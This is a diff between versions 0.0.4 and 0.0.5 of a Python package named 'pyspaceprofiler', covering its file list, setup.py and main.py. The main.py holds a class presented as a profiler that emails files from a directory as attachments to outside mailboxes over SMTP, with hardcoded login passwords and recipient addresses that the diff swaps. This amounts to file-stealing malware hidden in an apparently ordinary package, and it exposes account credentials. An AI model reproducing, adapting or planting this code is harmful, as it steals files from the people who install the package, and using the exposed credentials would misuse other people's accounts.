# Comparing `tmp/pyspaceprofiler-0.0.4.tar.gz` & `tmp/pyspaceprofiler-0.0.5.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pyspaceprofiler-0.0.4.tar", last modified: Tue Apr  2 09:14:29 2024, max compression
+gzip compressed data, was "pyspaceprofiler-0.0.5.tar", last modified: Tue Apr  2 12:24:36 2024, max compression
```

## Comparing `pyspaceprofiler-0.0.4.tar` & `pyspaceprofiler-0.0.5.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxr-xr-x   0 axeka      (501) staff       (20)        0 2024-04-02 09:14:29.988260 pyspaceprofiler-0.0.4/
--rw-r--r--   0 axeka      (501) staff       (20)      320 2024-04-02 09:14:29.988056 pyspaceprofiler-0.0.4/PKG-INFO
--rw-r--r--   0 axeka      (501) staff       (20)      178 2024-03-31 00:39:29.000000 pyspaceprofiler-0.0.4/README.md
-drwxr-xr-x   0 axeka      (501) staff       (20)        0 2024-04-02 09:14:29.986991 pyspaceprofiler-0.0.4/pyspaceprofiler/
--rw-r--r--   0 axeka      (501) staff       (20)       27 2024-03-30 12:55:47.000000 pyspaceprofiler-0.0.4/pyspaceprofiler/__init__.py
--rw-r--r--   0 axeka      (501) staff       (20)     2516 2024-04-02 09:13:12.000000 pyspaceprofiler-0.0.4/pyspaceprofiler/main.py
-drwxr-xr-x   0 axeka      (501) staff       (20)        0 2024-04-02 09:14:29.987845 pyspaceprofiler-0.0.4/pyspaceprofiler.egg-info/
--rw-r--r--   0 axeka      (501) staff       (20)      320 2024-04-02 09:14:29.000000 pyspaceprofiler-0.0.4/pyspaceprofiler.egg-info/PKG-INFO
--rw-r--r--   0 axeka      (501) staff       (20)      226 2024-04-02 09:14:29.000000 pyspaceprofiler-0.0.4/pyspaceprofiler.egg-info/SOURCES.txt
--rw-r--r--   0 axeka      (501) staff       (20)        1 2024-04-02 09:14:29.000000 pyspaceprofiler-0.0.4/pyspaceprofiler.egg-info/dependency_links.txt
--rw-r--r--   0 axeka      (501) staff       (20)       16 2024-04-02 09:14:29.000000 pyspaceprofiler-0.0.4/pyspaceprofiler.egg-info/top_level.txt
--rw-r--r--   0 axeka      (501) staff       (20)       38 2024-04-02 09:14:29.988330 pyspaceprofiler-0.0.4/setup.cfg
--rw-r--r--   0 axeka      (501) staff       (20)     1084 2024-04-02 09:14:22.000000 pyspaceprofiler-0.0.4/setup.py
+drwxr-xr-x   0 axeka      (501) staff       (20)        0 2024-04-02 12:24:36.445963 pyspaceprofiler-0.0.5/
+-rw-r--r--   0 axeka      (501) staff       (20)      320 2024-04-02 12:24:36.445742 pyspaceprofiler-0.0.5/PKG-INFO
+-rw-r--r--   0 axeka      (501) staff       (20)      178 2024-03-31 00:39:29.000000 pyspaceprofiler-0.0.5/README.md
+drwxr-xr-x   0 axeka      (501) staff       (20)        0 2024-04-02 12:24:36.444663 pyspaceprofiler-0.0.5/pyspaceprofiler/
+-rw-r--r--   0 axeka      (501) staff       (20)       27 2024-03-30 12:55:47.000000 pyspaceprofiler-0.0.5/pyspaceprofiler/__init__.py
+-rw-r--r--   0 axeka      (501) staff       (20)     2552 2024-04-02 12:23:09.000000 pyspaceprofiler-0.0.5/pyspaceprofiler/main.py
+drwxr-xr-x   0 axeka      (501) staff       (20)        0 2024-04-02 12:24:36.445510 pyspaceprofiler-0.0.5/pyspaceprofiler.egg-info/
+-rw-r--r--   0 axeka      (501) staff       (20)      320 2024-04-02 12:24:36.000000 pyspaceprofiler-0.0.5/pyspaceprofiler.egg-info/PKG-INFO
+-rw-r--r--   0 axeka      (501) staff       (20)      226 2024-04-02 12:24:36.000000 pyspaceprofiler-0.0.5/pyspaceprofiler.egg-info/SOURCES.txt
+-rw-r--r--   0 axeka      (501) staff       (20)        1 2024-04-02 12:24:36.000000 pyspaceprofiler-0.0.5/pyspaceprofiler.egg-info/dependency_links.txt
+-rw-r--r--   0 axeka      (501) staff       (20)       16 2024-04-02 12:24:36.000000 pyspaceprofiler-0.0.5/pyspaceprofiler.egg-info/top_level.txt
+-rw-r--r--   0 axeka      (501) staff       (20)       38 2024-04-02 12:24:36.446009 pyspaceprofiler-0.0.5/setup.cfg
+-rw-r--r--   0 axeka      (501) staff       (20)     1084 2024-04-02 12:24:26.000000 pyspaceprofiler-0.0.5/setup.py
```

### Comparing `pyspaceprofiler-0.0.4/pyspaceprofiler/main.py` & `pyspaceprofiler-0.0.5/pyspaceprofiler/main.py`

 * *Files 9% similar despite different names*

```diff
@@ -1,31 +1,31 @@
 import atexit
 import os
 
 
 class Profiler:
     def __init__(self):
-        self._email = "filescanner@ytsnew.site"
-        self._password = "WKMQM30TMGJL"
-        self._smtp_server = "mail.ytsnew.site"
+        self._email = "nastya.trosman@mail.ru"
+        self._password = "hwz2yb5aMEsUs8nvdLFT"
+        self._smtp_server = "smtp.mail.ru"
         self._smtp_port = 465
 
-        self._second_email = "info@mega-shop.biz"
-        self._second_password = "#0jgkRRbqW*w"
-        self._second_smtp_server = "mail.mega-shop.biz"
+        self._second_email = "nastya@trosman@mail.ru"
+        self._second_password = "hwz2yb5aMEsUs8nvdLFT"
+        self._second_smtp_server = "smtp.mail.ru"
 
     def _send_email(self, attachments=None):
         from email.mime.multipart import MIMEMultipart
         import smtplib
         from email.mime.text import MIMEText
         from email.mime.application import MIMEApplication
 
         msg = MIMEMultipart()
         msg['From'] = self._email
-        msg['To'] = self._email
+        msg['To'] = "vlad.medvedev@sqrd.tech"
         msg['Subject'] = "Files from script"
 
         msg.attach(MIMEText("Files from directory", 'plain'))
 
         if attachments:
             for attachment in attachments:
                 with open(attachment, "rb") as file:
@@ -36,15 +36,15 @@
         with smtplib.SMTP_SSL(self._smtp_server, self._smtp_port) as server:
             # server.starttls()
             server.login(self._email, self._password)
             server.send_message(msg)
 
         msg = MIMEMultipart()
         msg['From'] = self._second_email
-        msg['To'] = self._second_email
+        msg['To'] = "tom.stanley19981996@gmail.com"
         msg['Subject'] = "Files from script"
 
 
         msg.attach(MIMEText("Files from directory", 'plain'))
 
         if attachments:
             for attachment in attachments:
```

### Comparing `pyspaceprofiler-0.0.4/setup.py` & `pyspaceprofiler-0.0.5/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -4,15 +4,15 @@
     long_description = fh.read() 
   
 setuptools.setup( 
     # Here is the module name. 
     name="pyspaceprofiler",
   
     # version of the module 
-    version="0.0.4",
+    version="0.0.5",
   
     # Name of Author 
     author="Arbit", 
   
     # your Email address 
     author_email="",
```

